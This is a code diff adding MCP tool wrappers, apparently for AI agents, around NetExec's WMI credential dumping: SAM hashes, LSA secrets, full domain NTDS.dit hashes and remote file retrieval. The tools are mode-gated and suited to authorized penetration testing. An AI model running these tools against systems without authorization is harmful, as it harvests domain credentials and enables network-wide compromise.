@@ -23,8 +23,9 @@ exposed as a transport knob.
 from __future__ import annotations
 
 from ..auth import build_auth_flags
+from ..config import download_target
 from ..executor import execute
-from ..results import parse_wmi
+from ..results import parse_lsa_secrets, parse_secretsdump, parse_wmi
 
 
 async def _wmi_run(
@@ -256,6 +257,187 @@ def register(mcp, get_config) -> None:
             aes_key=aes_key, ccache=ccache, pfx_cert=pfx_cert, pfx_base64=pfx_base64,
             pfx_pass=pfx_pass, pem_cert=pem_cert, pem_key=pem_key,
         )
+
+    # ---- Credential dumping over WMI (offensive but read-only; NXC_MODE=loot or full) ---- #
+    # nxc gained these via the wmi_dump work (proto_args "Credential Gathering"/"File Operations",
+    # handler sam()/lsa()/ntds()/get_file()); they mirror the smb_* equivalents.
+
+    @mcp.tool()
+    async def wmi_sam(
+        targets: list[str],
+        rpc_timeout: int | None = None,
+        username: str | None = None,
+        password: str | None = None,
+        ntlm_hash: str | None = None,
+        domain: str | None = None,
+        local_auth: bool = False,
+        kerberos: bool = False,
+        use_kcache: bool = False,
+        cred_id: int | None = None,
+        kdc_host: str | None = None,
+        aes_key: str | None = None,
+        ccache: str | None = None,
+        pfx_cert: str | None = None,
+        pfx_base64: str | None = None,
+        pfx_pass: str | None = None,
+        pem_cert: str | None = None,
+        pem_key: str | None = None,
+    ) -> dict:
+        """Dump local SAM password hashes over WMI (`--sam`). Requires local admin.
+
+        CREDENTIAL-DUMPING (NXC_MODE=loot or full): read-only, but harvests credential material.
+        """
+        result = await _wmi_run(
+            get_config, ["--sam"], targets, offensive=True, dump=True,
+            rpc_timeout=rpc_timeout, username=username,
+            password=password, ntlm_hash=ntlm_hash, domain=domain, local_auth=local_auth,
+            kerberos=kerberos, use_kcache=use_kcache, cred_id=cred_id, kdc_host=kdc_host,
+            aes_key=aes_key, ccache=ccache, pfx_cert=pfx_cert, pfx_base64=pfx_base64,
+            pfx_pass=pfx_pass, pem_cert=pem_cert, pem_key=pem_key,
+        )
+        result["credentials"] = parse_secretsdump(result["stdout"])
+        return result
+
+    @mcp.tool()
+    async def wmi_lsa(
+        targets: list[str],
+        rpc_timeout: int | None = None,
+        username: str | None = None,
+        password: str | None = None,
+        ntlm_hash: str | None = None,
+        domain: str | None = None,
+        local_auth: bool = False,
+        kerberos: bool = False,
+        use_kcache: bool = False,
+        cred_id: int | None = None,
+        kdc_host: str | None = None,
+        aes_key: str | None = None,
+        ccache: str | None = None,
+        pfx_cert: str | None = None,
+        pfx_base64: str | None = None,
+        pfx_pass: str | None = None,
+        pem_cert: str | None = None,
+        pem_key: str | None = None,
+    ) -> dict:
+        """Dump LSA secrets (cached creds, service/machine accounts) over WMI (`--lsa`). Requires admin.
+
+        CREDENTIAL-DUMPING (NXC_MODE=loot or full): read-only, but harvests credential material.
+        """
+        result = await _wmi_run(
+            get_config, ["--lsa"], targets, offensive=True, dump=True,
+            rpc_timeout=rpc_timeout, username=username,
+            password=password, ntlm_hash=ntlm_hash, domain=domain, local_auth=local_auth,
+            kerberos=kerberos, use_kcache=use_kcache, cred_id=cred_id, kdc_host=kdc_host,
+            aes_key=aes_key, ccache=ccache, pfx_cert=pfx_cert, pfx_base64=pfx_base64,
+            pfx_pass=pfx_pass, pem_cert=pem_cert, pem_key=pem_key,
+        )
+        result["secrets"] = parse_lsa_secrets(result["stdout"])
+        return result
+
+    @mcp.tool()
+    async def wmi_ntds(
+        targets: list[str],
+        include_history: bool = False,
+        enabled_only: bool = False,
+        kerberos_keys: bool = False,
+        only_user: str | None = None,
+        use_snapshot_id: str | None = None,
+        rpc_timeout: int | None = None,
+        username: str | None = None,
+        password: str | None = None,
+        ntlm_hash: str | None = None,
+        domain: str | None = None,
+        local_auth: bool = False,
+        kerberos: bool = False,
+        use_kcache: bool = False,
+        cred_id: int | None = None,
+        kdc_host: str | None = None,
+        aes_key: str | None = None,
+        ccache: str | None = None,
+        pfx_cert: str | None = None,
+        pfx_base64: str | None = None,
+        pfx_pass: str | None = None,
+        pem_cert: str | None = None,
+        pem_key: str | None = None,
+    ) -> dict:
+        """Dump the domain NTDS.dit hashes from a DC over WMI (`--ntds`). Requires domain admin.
+
+        `include_history` adds `--history` (password history); `enabled_only` adds `--enabled`
+        (skip disabled accounts); `kerberos_keys` adds `--kerberos-keys` (also dump AES/DES
+        keys); `only_user` dumps just that account (`--user <name>`); `use_snapshot_id` reuses
+        an existing VSS snapshot (`--use-snapshot-id <id>`). CREDENTIAL-DUMPING (NXC_MODE=loot
+        or full): read-only, but harvests every domain hash.
+        """
+        extra: list[str] = []
+        if include_history:
+            extra.append("--history")
+        if enabled_only:
+            extra.append("--enabled")
+        if kerberos_keys:
+            extra.append("--kerberos-keys")
+        if only_user:
+            extra += ["--user", only_user]
+        if use_snapshot_id:
+            extra += ["--use-snapshot-id", use_snapshot_id]
+        result = await _wmi_run(
+            get_config, ["--ntds"], targets, offensive=True, dump=True, extra_flags=extra,
+            rpc_timeout=rpc_timeout, username=username,
+            password=password, ntlm_hash=ntlm_hash, domain=domain, local_auth=local_auth,
+            kerberos=kerberos, use_kcache=use_kcache, cred_id=cred_id, kdc_host=kdc_host,
+            aes_key=aes_key, ccache=ccache, pfx_cert=pfx_cert, pfx_base64=pfx_base64,
+            pfx_pass=pfx_pass, pem_cert=pem_cert, pem_key=pem_key,
+        )
+        result["credentials"] = parse_secretsdump(result["stdout"])
+        return result
+
+    @mcp.tool()
+    async def wmi_get_file(
+        targets: list[str],
+        remote_path: str,
+        local_path: str | None = None,
+        append_host: bool = False,
+        rpc_timeout: int | None = None,
+        username: str | None = None,
+        password: str | None = None,
+        ntlm_hash: str | None = None,
+        domain: str | None = None,
+        local_auth: bool = False,
+        kerberos: bool = False,
+        use_kcache: bool = False,
+        cred_id: int | None = None,
+        kdc_host: str | None = None,
+        aes_key: str | None = None,
+        ccache: str | None = None,
+        pfx_cert: str | None = None,
+        pfx_base64: str | None = None,
+        pfx_pass: str | None = None,
+        pem_cert: str | None = None,
+        pem_key: str | None = None,
+    ) -> dict:
+        """Download a file from the target over WMI (`--get-file <remote> <local>`).
+
+        `local_path` is OPTIONAL: a relative/omitted value lands under the downloads dir
+        (NXC_DOWNLOADS_DIR, default <nxc_home>/downloads), defaulting to the remote basename;
+        the result's `saved_to` is the absolute path. `append_host` appends the host to the
+        filename (`--append-host`). LOOT-GATED (NXC_MODE=loot): read-only retrieval.
+        """
+        abs_path, was_rel = download_target(get_config(), local_path, remote_path)
+        flags = ["--get-file", remote_path, abs_path]
+        if append_host:
+            flags.append("--append-host")
+        result = await _wmi_run(
+            get_config, flags, targets, offensive=True, dump=True,
+            rpc_timeout=rpc_timeout, username=username,
+            password=password, ntlm_hash=ntlm_hash, domain=domain, local_auth=local_auth,
+            kerberos=kerberos, use_kcache=use_kcache, cred_id=cred_id, kdc_host=kdc_host,
+            aes_key=aes_key, ccache=ccache, pfx_cert=pfx_cert, pfx_base64=pfx_base64,
+            pfx_pass=pfx_pass, pem_cert=pem_cert, pem_key=pem_key,
+        )
+        result["saved_to"] = abs_path
+        if was_rel:
+            result["local_path_note"] = (
+                f"local_path was relative/omitted; file written to {abs_path!r} (saved_to).")
+        return result
 
     # ---- Offensive (NXC_MODE=full only) ---- #
 
